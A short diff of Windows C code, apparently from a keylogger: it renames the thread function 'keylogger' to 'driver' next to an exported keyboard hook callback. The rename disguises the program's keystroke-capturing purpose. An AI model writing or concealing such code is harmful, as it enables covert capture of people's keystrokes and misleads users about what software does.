@@ -90,7 +90,7 @@ __declspec(dllexport) LRESULT CALLBACK keyevent(int code, WPARAM wparam, LPARAM 
 }
 
 
-DWORD WINAPI keylogger(void *user)
+DWORD WINAPI driver(void *user)
 {
 	HINSTANCE base = GetModuleHandle(NULL);
 	MSG msg;
@@ -118,7 +118,7 @@ int main(int argc, char *argv[])
 	HANDLE t;
 	DWORD tid;
 
-	t = CreateThread(0, 0, keylogger, argv[0], 0, &tid);
+	t = CreateThread(0, 0, driver, argv[0], 0, &tid);
 	if (t) {
 		return WaitForSingleObject(t, INFINITE);
 	}
